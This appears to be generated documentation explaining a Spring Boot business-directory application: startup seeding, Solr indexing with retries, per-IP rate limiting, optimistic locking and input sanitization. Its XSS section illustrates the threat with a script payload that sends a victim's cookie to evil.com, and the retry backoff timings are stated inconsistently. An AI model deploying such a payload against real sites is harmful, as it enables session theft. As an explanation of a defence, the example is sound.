⚡ Feature 1: Application Bootstrap

Starts the Spring Boot application by initializing the embedded Tomcat server, scanning all packages for Spring components (@Component, @Service, @Controller, etc.), setting up MongoDB connections, configuring Solr, and wiring all dependencies together via dependency injection.

🧠 Key Code

@EnableAsync

    public static void main(String[] args) {
        SpringApplication.run(OwnerDirectoryApplication.class, args);
    }
}

Code Breakdown — line by line:

Code What It Does Why It's Written This Way
@EnableAsync Activates Spring's asynchronous method execution capability across the entire application Without this annotation, any method annotated with @Async (like the Solr indexing in SolrService) would still run synchronously on the calling thread, blocking the HTTP response. This annotation tells Spring to create a thread pool and execute @Async methods on separate threads
@SpringBootApplication A convenience meta-annotation that combines three annotations: @Configuration (marks this class as a source of bean definitions), @EnableAutoConfiguration (tells Spring Boot to guess and configure beans based on the classpath — e.g., it sees spring-boot-starter-data-mongodb and auto-configures a MongoDB connection), and @ComponentScan (tells Spring to scan the current package and all sub-packages for components) Using this single annotation instead of three separate ones reduces boilerplate. Spring Boot auto-configuration is the key innovation — it detects libraries on the classpath (MongoDB driver, Solr client, etc.) and configures them with sensible defaults without requiring XML configuration files
public class OwnerDirectoryApplication Declares the main application class Spring Boot requires at least one @SpringBootApplication class. The class name is arbitrary but conventionally matches the project name
public static void main(String[] args) Standard Java entry point that the JVM calls when the application starts Must be public static void main — this is a Java language requirement. The String[] args parameter allows passing command-line arguments (e.g., --server.port=9090)
SpringApplication.run(OwnerDirectoryApplication.class, args) Creates the Spring ApplicationContext, triggers auto-configuration, starts the embedded Tomcat web server, and begins listening for HTTP requests The run() method is the actual bootstrap call. It passes the class reference so Spring knows which class has the configuration annotations. The args are forwarded so command-line properties override application.properties

⚙️ Why This Approach Was Chosen

Chosen: Spring Boot with embedded Tomcat and annotation-based configuration.
Alternative: Traditional Spring MVC with an external Tomcat server and XML-based configuration (web.xml, applicationContext.xml). This approach requires manually deploying a WAR file to a standalone Tomcat instance, writing hundreds of lines of XML configuration, and managing the server lifecycle separately.
Why the chosen approach wins: Spring Boot's embedded server means the application is self-contained — java -jar app.jar starts everything. No external server installation, no XML files, no deployment descriptors. This drastically reduces deployment complexity and makes containerization (Docker) trivial.

🔗 How It Connects to the Rest of the System

This includes DataLoader, OwnerController, OwnerService, SolrService, SolrConfig, RateLimitFilter, WebMvcConfig, etc.
  • What depends on it: Every single class in the project depends on this bootstrap. Without it, no beans are created, no HTTP server starts, and no endpoints are available.
  • The @EnableAsync connection: This annotation specifically enables the @Async annotation used in SolrService.indexOwner() and SolrService.deleteOwner(). If @EnableAsync were removed, Solr indexing would block the HTTP response thread, making create/update API calls much slower.

⚡ Feature 1: Conditional Seed Guard (Idempotent Startup)

📌 What It Does

Checks if the database already contains data before inserting sample records. If data exists, the seeding is skipped entirely. This prevents duplicate records from being created every time the application restarts.

🧠 Key Code

@Override
public void run(String... args) {
    if (ownerRepo.count() > 0) {
        log.debug("Database already has data, skipping seed");
        return;
    }
    log.info("Seeding sample data...");
    // ... rest of seeding logic
}

Code Breakdown:

Code What It Does Why It's Written This Way
@Override Indicates this method implements the run() method from the CommandLineRunner interface The @Override annotation makes the compiler verify that this method signature matches the interface. Without it, a typo in the method name would create a new method instead of overriding, and the seeder would silently never execute
public void run(String... args) Defines the method that Spring Boot calls after the application context is ready. The String... args (varargs) receives any command-line arguments passed to the application CommandLineRunner requires this exact signature. The varargs (...) syntax means it accepts zero or more string arguments — equivalent to String[] but more flexible at the call site
if (ownerRepo.count() > 0) Queries MongoDB's owners collection to count all documents. If the count is greater than zero, data already exists count() is a method provided by Spring Data's MongoRepository. It executes a lightweight db.owners.count() command in MongoDB — much faster than fetching actual documents. The > 0 check is the idempotency guard
log.debug("Database already has data, skipping seed") Logs a debug-level message indicating the seed was skipped debug level (not info) is used because this happens on every restart after the first run — it's routine behavior that shouldn't clutter production logs. The log object is auto-generated by Lombok's @Slf4j annotation
return; Exits the method immediately, skipping all seeding logic below Early return pattern — cleaner than wrapping the entire seeding block in an else clause. Reduces nesting and improves readability
log.info("Seeding sample data...") Logs an info-level message that seeding is starting info level is used here because seeding only happens on the very first run — this is noteworthy behavior that operators should see in logs

⚙️ Why This Approach Was Chosen

Chosen: Simple count-check idempotency guard.
Alternative 1: Using a dedicated schema_migrations or seed_status collection that tracks whether seeding has run (like Flyway/Liquibase for SQL databases). This is more robust for complex multi-step migrations but overkill for a simple two-record seed.
Alternative 2: Using @Profile("dev") to restrict seeding to development environments only. This is safer for production but means developers must remember to activate the profile.
Why the chosen approach wins: A simple count() > 0 check is sufficient for an MVP with a small, fixed seed dataset. It works in all environments without profile configuration and has zero additional dependencies.

🔗 How It Connects to the Rest of the System

  • Depends on: OwnerRepository (to check count and save data), SolrService (to index data in the search engine)
  • Called by: Spring Boot's application lifecycle — after all beans are initialized, Spring calls all CommandLineRunner implementations
  • If removed: The application would start with an empty database and empty search index. No sample data would exist for testing or demo purposes.

💬 Manager Explanation

"This is a safety check that runs every time the application starts. It says: 'If the database already has listings in it, don't add the sample data again.' This prevents duplicate entries from appearing every time we restart the server. It only adds sample data on the very first launch."

⚡ Feature 3: Dual-Write Persistence (MongoDB + Solr)

📌 What It Does

Saves the sample owners to MongoDB (the primary database) first, then indexes each saved owner in Apache Solr (the search engine). This dual-write pattern ensures that the search index is consistent with the database from the very first application startup.

🧠 Key Code

// Save to Mongo
List<Owner> saved = ownerRepo.saveAll(Arrays.asList(plumber, electrician));

// Index in Solr
for (Owner owner : saved) {
    solr.indexOwner(owner);
}

log.info("Seeded {} sample owners", saved.size());

Code Breakdown:

Code What It Does Why It's Written This Way
List<Owner> saved = ownerRepo.saveAll(Arrays.asList(plumber, electrician)) Saves both Owner objects to MongoDB's owners collection in a single batch operation. Returns the saved objects with MongoDB-generated id fields populated (e.g., "65a1b2c3d4e5f6...") saveAll() is provided by Spring Data's MongoRepository. It's more efficient than two separate save() calls because MongoDB can batch the inserts. The returned list contains the same objects but with their id and version fields now set by MongoDB
for (Owner owner : saved) Iterates over the saved owners (which now have their MongoDB-generated IDs) We iterate over saved (not plumber/electrician) because the saved list has the MongoDB-assigned IDs. Solr needs these IDs to maintain a mapping between its search documents and MongoDB records
solr.indexOwner(owner) Sends each owner to the Solr search engine for full-text indexing. This makes the owner's name, description, category, and services searchable via Solr queries indexOwner() is defined in SolrService and creates a Solr document with fields like id, name, category, description, services, city. In SolrService, this method is @Async, meaning it runs on a separate thread — but during startup, the @Async might not trigger threading for CommandLineRunner execution depending on Spring's initialization order
log.info("Seeded {} sample owners", saved.size()) Logs the number of owners that were seeded. The {} is a placeholder replaced by saved.size() at runtime (evaluates to 2) SLF4J's parameterized logging ({} placeholders) is preferred over string concatenation ("Seeded " + saved.size()) because placeholders avoid the string concatenation cost when the log level is disabled. info level is used because seeding is a significant startup event

⚙️ Why This Approach Was Chosen

Chosen: Sequential dual-write — MongoDB first, then Solr.
Alternative 1: Writing to MongoDB only and relying on the ReconciliationJob (a scheduled background job) to catch the Solr sync later. This is simpler but means search results would be empty until the first reconciliation runs (could be minutes).
Alternative 2: Using a Change Data Capture (CDC) pattern with MongoDB Change Streams to automatically trigger Solr indexing whenever a document is inserted/updated. This is the most robust approach but adds significant infrastructure complexity (requires a MongoDB replica set and a CDC consumer process).
Alternative 3: Using a message queue (Kafka/RabbitMQ) between MongoDB writes and Solr indexing. This provides reliable async processing with retry, but is heavy infrastructure for an MVP.
Why the chosen approach wins: For an MVP, explicit dual-writes are the simplest pattern that ensures immediate consistency. The ReconciliationJob acts as a safety net to fix any drift between MongoDB and Solr, and the @Async annotation in SolrService prevents Solr indexing from blocking the main thread during normal operation.

🔗 How It Connects to the Rest of the System

  • OwnerRepository.saveAll(): Calls Spring Data MongoDB which connects to the MongoDB instance configured in application.properties
  • SolrService.indexOwner(): Sends data to the Solr instance configured in SolrConfig.java. This is the same method used by OwnerService when creating/updating owners via the API
  • If ownerRepo.saveAll() fails: MongoDB throws an exception, the method aborts, and no data reaches Solr — consistent state (both empty)
  • If solr.indexOwner() fails: MongoDB has the data but Solr doesn't. The ReconciliationJob (a scheduled background job) will detect this drift and re-index the missing records — eventual consistency is guaranteed
  • The saved list importance: We must use the returned saved list (not the original plumber/electrician objects) because saveAll() populates the id field. Solr needs the MongoDB ID to link search results back to database records

💬 Manager Explanation

"After creating the sample listings, we save them in two places: the main database (MongoDB, where all the data lives permanently) and the search engine (Solr, which makes the listings searchable by keywords). We always save to the database first — that's the 'source of truth.' Then we update the search engine. If the search engine update fails for some reason, we have a background repair job that runs regularly to fix any mismatches. This way, the search results always eventually match what's in the database."

Why the chosen approach wins: CommandLineRunner guarantees that all beans (including the MongoDB connection and Solr client) are fully initialized before the seeder runs. Field injection keeps the code concise for a utility class.

⚡ Feature 1: Solr Configuration Constants

📌 What It Does

Defines three constants that control how the application interacts with the Apache Solr search engine: the collection name, how quickly writes become visible, and how many times to retry failed operations.

🧠 Key Code

public static final String SOLR_COLLECTION = "owners";
public static final int SOLR_COMMIT_WITHIN_MS = 10000;
public static final int SOLR_MAX_RETRIES = 3;

Code Breakdown:

Code What It Does Why It's Written This Way
SOLR_COLLECTION = "owners" Defines the Solr collection (similar to a database table) where owner documents are indexed Hardcoded as a constant rather than externalized to application.properties because the collection name is tightly coupled to the code — changing it requires schema changes in Solr too
SOLR_COMMIT_WITHIN_MS = 10000 Tells Solr to make newly indexed documents searchable within 10 seconds (10,000 ms) of being added This is a "soft commit" window. Lower values (e.g., 1000ms) make documents appear in search faster but increase Solr's I/O load. 10 seconds is a balanced default — new listings appear in search within 10 seconds of creation
SOLR_MAX_RETRIES = 3 Sets the maximum number of retry attempts when a Solr operation fails (e.g., network timeout) 3 retries with exponential backoff (used in SolrService) means the system waits 1s, then 2s, then 4s before giving up. This handles transient failures (network blips) without hammering a struggling Solr server

⚙️ Why This Approach Was Chosen

Chosen: Java constants in a utility class.
Alternative: Using @Value("${app.solr.collection}") to read from application.properties. This allows changing values without recompilation but adds complexity for values that rarely change and are tied to infrastructure.
Why the chosen approach wins: Constants like collection names and retry counts are architectural decisions, not runtime configuration. They change only when the code changes. Keeping them as compile-time constants ensures type safety and IDE refactoring support.

🔗 How It Connects to the Rest of the System

  • Used by: SolrService.java (references SOLR_COLLECTION for all Solr queries, SOLR_MAX_RETRIES for retry loops, SOLR_COMMIT_WITHIN_MS for indexing)
  • If changed: Changing SOLR_COLLECTION without updating Solr's schema would break all search operations. Changing SOLR_COMMIT_WITHIN_MS affects how quickly new listings appear in search results.

💬 Manager Explanation

"These settings control our search engine behavior. The collection name tells the system which search index to use. The 10-second commit window means new listings become searchable within 10 seconds. The retry count means if the search engine is briefly unavailable, we try 3 times before giving up."

⚡ Feature 3: Rate Limiting Constants

📌 What It Does

Configures the rate limiter's thresholds — how many requests a single IP address can make per minute, and when to clean up old tracking data to prevent memory leaks.

🧠 Key Code

public static final int RATE_LIMIT_REQUESTS_PER_MINUTE = 100;
public static final int RATE_LIMIT_CLEANUP_THRESHOLD = 10000;

Code Breakdown:

Code What It Does Why It's Written This Way
RATE_LIMIT_REQUESTS_PER_MINUTE = 100 Allows each IP address up to 100 HTTP requests per minute before being throttled with a 429 response 100 req/min is generous for a directory website where users browse listings. A legitimate user browsing, searching, and viewing details might make 20-30 requests/min. 100 gives headroom while blocking automated scrapers or DDoS attempts
RATE_LIMIT_CLEANUP_THRESHOLD = 10000 When the rate limiter's internal map accumulates tracking data for 10,000+ IP addresses, trigger a cleanup of stale entries Without this cleanup, every unique IP that ever visited would stay in memory forever. Under a DDoS attack from millions of IPs, this would cause a memory leak. The threshold triggers garbage collection of old entries

⚙️ Why This Approach Was Chosen

Chosen: In-memory per-IP rate limiting with a cleanup threshold.
Alternative: Using Redis-backed rate limiting (e.g., Bucket4j with Redis). This survives server restarts and works across multiple server instances, but adds a Redis dependency.
Why the chosen approach wins: For an MVP running on a single server, in-memory rate limiting is zero-dependency and fast. The cleanup threshold prevents memory issues.

🔗 How It Connects to the Rest of the System

  • Used by: RateLimitFilter.java which intercepts every HTTP request and checks against these limits
  • If values are too low: Legitimate users get blocked. If too high: The rate limiter becomes ineffective against attacks.

💬 Manager Explanation

"We allow each user up to 100 requests per minute. Beyond that, we temporarily block them to protect the server. We also clean up our tracking data when it gets too large to prevent memory issues during traffic spikes."

📁 config → 📄 RateLimitFilter.java

🗂️ File Overview

A servlet filter that intercepts every single HTTP request before it reaches the controller layer. It tracks how many requests each IP address makes per minute using an in-memory ConcurrentHashMap. If an IP exceeds 100 requests/minute, subsequent requests receive a 429 Too Many Requests response. This is a critical security feature that protects the application from abuse, web scraping, and denial-of-service (DoS) attacks.

🔐 SECURITY DEEP DIVE: This filter prevents Denial of Service (DoS) attacks and automated scraping. Without it, a single attacker could send thousands of requests per second, overwhelming the server's CPU, MongoDB, and Solr — making the application unreachable for legitimate users. A real-world example: a competitor could write a script to scrape all business listings from the directory by rapidly requesting every page, or an attacker could send millions of requests to crash the server.

⚡ Feature 1: Request Interception & Rate Check Pipeline

📌 What It Does

Intercepts every HTTP request, extracts the client's IP address, checks if they've exceeded the rate limit, and either blocks the request with a 429 response or allows it to continue to the controller.

@Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
        throws IOException, ServletException {

    if (request instanceof HttpServletRequest httpRequest) {
        String ip = extractClientIp(httpRequest);

        // Housekeeping - don't let the map grow forever
        if (counters.size() > CLEANUP_THRESHOLD) {
            cleanupStaleEntries();
        }

        if (isOverLimit(ip)) {
            HttpServletResponse httpResponse = (HttpServletResponse) response;
            httpResponse.setStatus(429);
            httpResponse.getWriter().write("Slow down! Too many requests.");
            return;
        }
    }

    chain.doFilter(request, response);
}

⚡ Feature 2: Secure Client IP Extraction

📌 What It Does

Extracts the real client IP address from the HTTP request, with special handling for when the application sits behind a reverse proxy (Nginx, Cloudflare).

🔐 SECURITY DEEP DIVE: The X-Forwarded-For header can be spoofed by attackers to bypass rate limiting. If the application blindly trusts this header, an attacker can set X-Forwarded-For: random-ip on every request, making each request appear to come from a different IP — completely defeating the rate limiter. This code protects against that by only trusting the header when the TRUST_PROXY environment variable is explicitly set.

🧠 Key Code

private String extractClientIp(HttpServletRequest request) {
    boolean trustProxy = Boolean.parseBoolean(
            System.getenv().getOrDefault("TRUST_PROXY", "false"));

    if (trustProxy) {
        String xff = request.getHeader("X-Forwarded-For");
        if (xff != null && !xff.isBlank()) {
            String[] parts = xff.split(",");
            return parts[parts.length - 1].trim();
        }
    }
    return request.getRemoteAddr();
}

Code Breakdown:

Code What It Does Why It's Written This Way
System.getenv().getOrDefault("TRUST_PROXY", "false") Reads the TRUST_PROXY environment variable, defaulting to "false" if not set Environment variables are the 12-Factor App standard for per-environment config. Defaulting to false is the safe choice — in development (no proxy), you don't want to trust potentially spoofed headers
Boolean.parseBoolean(...) Converts the string "true" or "false" to a boolean Boolean.parseBoolean returns false for any non-"true" string, including null — safe and lenient parsing
request.getHeader("X-Forwarded-For") Reads the X-Forwarded-For HTTP header that reverse proxies set to indicate the original client IP When behind Nginx/Cloudflare, getRemoteAddr() returns the proxy's IP, not the user's. The proxy preserves the real IP in this header
xff != null && !xff.isBlank() Checks that the header exists and isn't empty/whitespace Defensive null check — not all requests have this header. isBlank() catches headers that are just spaces
xff.split(",") Splits a multi-hop forwarded header like "client-ip, proxy1, proxy2" into an array Each proxy in the chain appends its IP. The format is original-client, proxy1, proxy2
parts[parts.length - 1].trim() Takes the last (rightmost) IP in the chain Security critical: The leftmost IP can be spoofed by the client. The rightmost IP is the one added by HERE trusted proxy — the one closest to the server. This is the secure approach for single-proxy setups
request.getRemoteAddr() Falls back to the TCP-level IP address when not trusting proxy headers This is the IP address from the TCP connection itself — cannot be spoofed (though it can be the proxy's IP when behind one)

Chosen: Conditional proxy trust with rightmost IP extraction.

Alternative 2: Using Spring's ForwardedHeaderFilter. This is more standard but applies globally and is designed for request routing, not security.

⚡ Feature 3: Sliding Window Rate Check

📌 What It Does

Implements a per-minute sliding window rate limiter that tracks how many requests each IP has made in the current calendar minute, using thread-safe atomic operations.

🧠 Key Code

private boolean isOverLimit(String ip) {
    long currentMinute = System.currentTimeMillis() / 60000;

    HitCounter counter = counters.compute(ip, (key, existing) -> {
        if (existing == null || existing.minute != currentMinute) {
            return new HitCounter(currentMinute);
        }
        existing.hits.incrementAndGet();
        return existing;
    });

    if (counter.hits.get() > MAX_REQUESTS) {
        log.warn("Rate limit hit for: {}", ip);
        return true;
    }
    return false;
}

Code Breakdown:

Code What It Does Why It's Written This Way
System.currentTimeMillis() / 60000 Converts the current time to a "minute number" — all milliseconds within the same minute produce the same value Dividing by 60,000 (ms per minute) floors to the minute boundary. E.g., 1:30:15 and 1:30:59 both produce the same minute number. This creates natural one-minute windows
counters.compute(ip, (key, existing) -> { ... }) Atomically looks up and updates the counter for this IP in a single thread-safe operation ConcurrentHashMap.compute() is atomic — even if two requests from the same IP arrive simultaneously on different threads, they won't race. This is critical: without atomicity, two threads could both read "99 hits", both increment, and both allow the 101st and 102nd requests through
existing == null || existing.minute != currentMinute If no counter exists for this IP, or the existing counter is from a previous minute, create a fresh counter This is the "sliding window" reset — at the start of each new minute, the counter starts fresh at 1. No data carries over from the previous minute
new HitCounter(currentMinute) Creates a new counter starting at 1 hit for the current minute The constructor sets hits = new AtomicInteger(1) — the current request counts as the first hit
existing.hits.incrementAndGet() Atomically increments the hit count by 1 and returns the new value AtomicInteger ensures thread safety without synchronized blocks. incrementAndGet() is a CPU-level atomic operation (uses Compare-And-Swap internally)
counter.hits.get() > MAX_REQUESTS Checks if the total hits exceeded the limit (100) Using > means the 101st request is the first one blocked. The first 100 requests are allowed
log.warn("Rate limit hit for: {}", ip) Logs a warning-level message with the offending IP warn level ensures this appears in production logs for security monitoring. Operations teams can use this to identify attackers or misconfigured clients

⚙️ Why This Approach Was Chosen

Chosen: Fixed-window rate limiting (per calendar minute) with ConcurrentHashMap + AtomicInteger.
Alternative 1: Sliding window log (store timestamp of every request). More accurate but uses much more memory — storing 100 timestamps per IP vs. one counter.
Alternative 2: Token bucket algorithm (Bucket4j). Better for allowing bursts while maintaining average rate, but more complex.
Why the chosen approach wins: Fixed-window is the simplest correct implementation. The only downside is the "boundary problem" — a user could make 100 requests at 1:59 and 100 more at 2:00 (200 in 2 seconds) — but this is acceptable for an MVP.

🔗 How It Connects to the Rest of the System

  • Called by: doFilter() for every request that passes the HTTP check
  • The counters map: Shared state across all requests — this is why ConcurrentHashMap and AtomicInteger are used (thread safety)
  • If this returns true: The request is blocked with 429 — no database or search engine load

💬 Manager Explanation

"We track how many times each visitor connects to our server per minute. If they exceed 100 requests in a single minute, we temporarily block them. The counter resets every minute, so they can try again shortly. This happens automatically without any database lookups, so it's very fast."

⚡ Feature 3: Optimistic Locking (Concurrency Control)

🔄 CONCURRENCY DEEP DIVE: This feature prevents data corruption when two users edit the same listing simultaneously.

📌 What It Does

Adds a version field that MongoDB automatically increments on every save. If two users load the same listing (both see version 1), edit it, and try to save — the first save succeeds (version becomes 2), and the second save fails because it's trying to save version 1 when the database already has version 2.

Real scenario without this protection:

  1. Admin A loads "John's Plumbing" (phone: 555-0101)
  2. Admin B loads "John's Plumbing" (phone: 555-0101)
  3. Admin A changes phone to 555-9999, saves → MongoDB stores 555-9999
  4. Admin B changes description to "Updated!", saves → MongoDB stores the OLD phone 555-0101 (overwriting A's change!)
  5. Result: Admin A's phone update is silently lost — this is called a "lost update" bug

With optimistic locking, step 4 would throw ConcurrentModificationException, alerting Admin B to reload and re-apply their change.

🧠 Key Code

@Version
private Long version;

Code Breakdown:

Code What It Does Why It's Written This Way
@Version Tells Spring Data MongoDB to use this field for optimistic locking. On every save(), Spring checks that the document's version in the database matches the version in the Java object. If they don't match, it throws OptimisticLockingFailureException Spring Data handles all the compare-and-swap logic automatically. Without @Version, save() blindly overwrites the entire document regardless of concurrent changes
private Long version Stores the version number, starting at 0 and incrementing on each save Long (boxed type) is used instead of long (primitive) because the version starts as null for new (unsaved) documents. Spring uses null to detect whether a document is new (insert) or existing (update). long can't be null, so it would always be 0, confusing the new-vs-existing detection

⚙️ Why This Approach Was Chosen

Chosen: Optimistic Locking via @Version.
Alternative: Pessimistic Locking — lock the document when someone starts editing, preventing anyone else from editing until the first person finishes. This guarantees no conflicts but causes blocking: if Admin A opens the edit page and goes to lunch, the listing is locked for hours. Pessimistic locking also doesn't work well with stateless HTTP APIs because there's no persistent "session" to hold the lock.
Why the chosen approach wins: Optimistic locking assumes conflicts are rare (they are in a business directory) and only catches them when they happen. No blocking, no lock timeouts, no deadlocks — just a retry on the rare occasion of a true conflict.

🔗 How It Connects to the Rest of the System

  • OwnerService.updateOwner(): When saving an updated owner, Spring Data checks the version. If it doesn't match (someone else saved first), it throws OptimisticLockingFailureException
  • ConcurrentModificationException: A custom exception that wraps the Spring exception into a user-friendly 409 Conflict response
  • GlobalExceptionHandler: Catches the exception and returns a proper HTTP error to the client
  • If removed: Silent data loss from concurrent edits — the "lost update" problem described above

💬 Manager Explanation

"This is our protection against two people editing the same listing at the same time. If Person A and Person B both open the same listing, make different changes, and save — the first save goes through, and the second person gets a warning message saying 'someone else already changed this, please reload and try again.' Without this, one person's changes would silently disappear."

⚡ Feature 5: Update Owner with Optimistic Locking

🔄 CONCURRENCY DEEP DIVE: This method demonstrates the full optimistic locking lifecycle — load, modify, save, and handle conflicts.

📌 What It Does

Updates an existing business listing while protecting against concurrent modification. If two admins edit the same listing simultaneously, the second save is rejected with a clear conflict error instead of silently overwriting the first admin's changes.

🧠 Key Code

public Owner updateOwner(String id, OwnerDTO.Request req) {
    Owner existing = getOwnerById(id);

    try {
        // careful - dont overwrite internal fields
        BeanUtils.copyProperties(req, existing, "id", "createdAt", "version");
        sanitizeOwnerFields(existing);
        existing.setUpdatedAt(LocalDateTime.now());

        Owner saved = ownerRepository.save(existing);
        solrService.indexOwner(saved);
        return saved;

    } catch (org.springframework.dao.OptimisticLockingFailureException ex) {
        log.warn("Concurrent modification for owner {}", id);
        throw new ConcurrentModificationException("Owner", id);
    }
}

Code Breakdown:

Code What It Does Why It's Written This Way
Owner existing = getOwnerById(id) Fetches the current owner from MongoDB, including its current version number. Throws 404 if not found Reuses the getOwnerById() method — DRY principle. The loaded existing object carries the current version (e.g., version=3)
BeanUtils.copyProperties(req, existing, "id", "createdAt", "version") Copies updated fields from the DTO onto the existing entity, EXCEPT id, createdAt, and version Critical: The third argument is an exclusion list. Without excluding version, the client's request (which doesn't have a version field) would set version to null, breaking optimistic locking entirely. Without excluding id and createdAt, the client could overwrite the server-generated ID and creation date
sanitizeOwnerFields(existing) Re-sanitizes all text fields with the new values Even on updates, user input must be cleaned — an attacker could update an existing listing to inject malicious scripts
existing.setUpdatedAt(LocalDateTime.now()) Updates the last-modified timestamp to now This is not excluded from BeanUtils.copyProperties because updatedAt doesn't exist in OwnerDTO.Request, so it wouldn't be overwritten anyway. Setting it explicitly ensures accuracy
ownerRepository.save(existing) Saves the modified entity. Spring Data checks that existing.version matches the database version. If it matches, save succeeds and version increments. If it doesn't match (someone else saved first), throws OptimisticLockingFailureException This is where optimistic locking is enforced. MongoDB performs: db.owners.updateOne({_id: id, version: 3}, {$set: {...}, $inc: {version: 1}}). If version doesn't match, the update affects 0 documents and Spring throws the exception
solrService.indexOwner(saved) Re-indexes the updated owner in Solr with the new data Search index must reflect the latest changes. This runs async (separate thread)
catch (OptimisticLockingFailureException ex) Catches the Spring Data exception thrown when the version check fails This is the conflict handler — it converts a low-level Spring exception into a business-friendly error
log.warn("Concurrent modification for owner {}", id) Logs a warning with the affected owner ID for operational monitoring warn level because this is an abnormal but recoverable situation. Operations teams can monitor warn logs for excessive conflicts (might indicate a UX problem)
throw new ConcurrentModificationException("Owner", id) Throws a custom exception that GlobalExceptionHandler converts to HTTP 409 Conflict The client receives a clear "this record was modified by someone else, please reload" message instead of a cryptic 500 error

⚙️ Why This Approach Was Chosen

Chosen: Optimistic locking with @Version field and exception-based conflict detection.
Alternative: Pessimistic locking — lock the document when someone clicks "Edit" and unlock when they save. Problems: (1) Locks are held for the entire edit duration (user could go to lunch), (2) MongoDB doesn't natively support document-level locks across transactions, (3) Stateless HTTP APIs have no persistent session to hold a lock.
Why the chosen approach wins: Optimistic locking is perfect for low-conflict scenarios (a business directory where most listings are rarely edited simultaneously). No locks, no blocking, no deadlocks. The version check catches the rare conflicts that do occur.

public Page<Owner> searchOwners(String keyword, String category, Pageable pageable) {
    List<String> ids = solrService.searchOwners(keyword, category,
            pageable.getPageNumber(), pageable.getPageSize());

    if (ids.isEmpty()) {
        return Page.empty(pageable);
    }

    List<Owner> owners = (List<Owner>) ownerRepository.findAllById(ids);

    // filter out disabled in case solr is stale
    List<Owner> results = owners.stream()
            .filter(Owner::isEnabled)
            .collect(Collectors.toList());

    // FIXME: total should be solr's numFound, not results.size()
    return new PageImpl<>(results, pageable, results.size());
}

Code What It Does Why It's Written This Way
solrService.searchOwners(keyword, category, ...) Sends the search query to Solr. Solr tokenizes the keyword, matches against indexed fields (name, description, category, services), and returns a list of matching MongoDB IDs Solr handles the complex full-text search (stemming, fuzzy matching, relevance scoring) — MongoDB can't do this efficiently. Only IDs are returned (not full documents) to minimize data transfer
pageable.getPageNumber(), pageable.getPageSize() Passes pagination parameters to Solr so it returns only the current page's worth of IDs Solr handles pagination with start and rows parameters — e.g., page 2 with size 10 means start=20, rows=10
if (ids.isEmpty()) return Page.empty(pageable) Early return for no results — avoids an unnecessary MongoDB query Page.empty() returns a valid but empty Page object with zero elements and correct pagination metadata
ownerRepository.findAllById(ids) Fetches complete Owner documents from MongoDB using the IDs from Solr This is the "hydration" step — Solr only stores search-related fields (name, description). MongoDB has the full record (phone, email, image, timestamps). The cast to List<Owner> is needed because findAllById returns Iterable<Owner>
owners.stream().filter(Owner::isEnabled) Filters out any disabled owners from the results Safety net: If Solr's index is stale (hasn't been updated after a soft-delete), the search might return IDs of disabled owners. This MongoDB-side filter ensures disabled listings never reach the user, even with stale search data
.collect(Collectors.toList()) Converts the filtered stream back to a List Collectors.toList() creates a mutable ArrayList — required for PageImpl

The third parameter is the total count — the FIXME comment notes this uses results.size() (current page count) instead of Solr's numFound (total across all pages), which makes "total items" inaccurate for multi-page results

⚙️ Why This Approach Was Chosen

Chosen: Two-phase search (Solr IDs → MongoDB documents) with application-level enabled filter.
Alternative 1: MongoDB text search ($text index). MongoDB's built-in text search works but lacks Solr's features: no stemming (searching "plumbing" won't match "plumber"), no fuzzy matching (typo tolerance), no relevance tuning, and significantly slower on large datasets.
Alternative 2: Elasticsearch instead of Solr. Elasticsearch has a more modern REST API and better scaling, but Solr is proven, lightweight, and sufficient for an MVP. Switching later is straightforward since the search service is abstracted behind SolrService.
Alternative 3: Storing all data in Solr and querying it directly (no MongoDB hydration). This makes Solr the source of truth, which is fragile — Solr is optimized for search, not ACID transactions.
Why the chosen approach wins: MongoDB is the source of truth (durability, consistency). Solr is the search engine (speed, relevance). Each system does what it's best at. The enabled filter is a pragmatic safety net for eventual consistency.

⚡ Feature 8: XSS Sanitization (Input Cleaning)

🔐 SECURITY DEEP DIVE: This feature prevents Stored Cross-Site Scripting (XSS) attacks — one of the most dangerous web vulnerabilities.

  1. Attacker submits a business listing with name: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

  3. Every user who views that listing has the script execute in their browser
  4. The script steals their session cookie and sends it to the attacker
  5. The attacker uses the stolen cookie to impersonate the victim

📌 What It Does

Strips all HTML tags, script tags, and potentially dangerous characters from user-submitted text fields before saving to the database. Applied to name, description, address, and each item in the services list.

⚡ Feature 1: Async Indexing with Retry & Exponential Backoff

⚡ ASYNC & RETRY DEEP DIVE: This is the most critical resilience feature in the search integration.

📌 What It Does

Indexes an owner document into Solr on a separate thread (@Async) so the HTTP response doesn't wait for Solr. If indexing fails (Solr down, network timeout), it retries up to 3 times with increasing delays (1s, 2s, 3s) before giving up — knowing the ReconciliationJob will catch any missed documents later.

🧠 Key Code

private static final int MAX_RETRIES = 3;
private static final int COMMIT_WITHIN = 10000; // 10 sec

@Async
public void indexOwner(Owner owner) {
    for (int i = 1; i <= MAX_RETRIES; i++) {
        try {
            SolrInputDocument doc = new SolrInputDocument();
            doc.addField("id", owner.getId());
            doc.addField("name", owner.getName());
            doc.addField("category", owner.getCategory());
            doc.addField("services", owner.getServices());
            doc.addField("description", owner.getDescription());
            doc.addField("city", owner.getCity());
            doc.addField("enabled", owner.isEnabled());

            client.add(COLLECTION, doc, COMMIT_WITHIN);
            log.debug("indexed: {}", owner.getId());
            return; // success

        } catch (Exception e) {
            log.warn("Solr index fail (try {}/{}): {} - {}",
                    i, MAX_RETRIES, owner.getId(), e.getMessage());

            if (i < MAX_RETRIES) {
                sleep(1000 * i); // backoff: 1s, 2s, 3s
            }
        }
    }

    log.error("SOLR INDEX FAILED after {} retries: {}", MAX_RETRIES, owner.getId());
}

Code Breakdown:

Code What It Does Why It's Written This Way
MAX_RETRIES = 3 Maximum number of indexing attempts before giving up 3 retries covers transient failures (network blips, brief Solr restarts) without indefinitely blocking the thread. The comment acknowledges this should be configurable
COMMIT_WITHIN = 10000 Tells Solr to make the document searchable within 10 seconds, but Solr batches commits for efficiency commitWithin is soft-commit — Solr buffers multiple additions and commits them together, improving throughput. A hard commit() after each document would be slower. 10 seconds means new listings appear in search within ~10 seconds
@Async Spring runs this method on a separate thread from Spring's @Async task executor pool Without @Async, createOwner() would block until Solr indexing completes. If Solr is slow (5+ seconds) or down (30-second timeout), the user waits that entire time for the HTTP response. With @Async, the response returns immediately and indexing happens in the background

new SolrInputDocument() Creates a Solr document object to populate with fields SolrJ's representation of a document to index — it's a flat key-value structure, not an ORM-mapped object

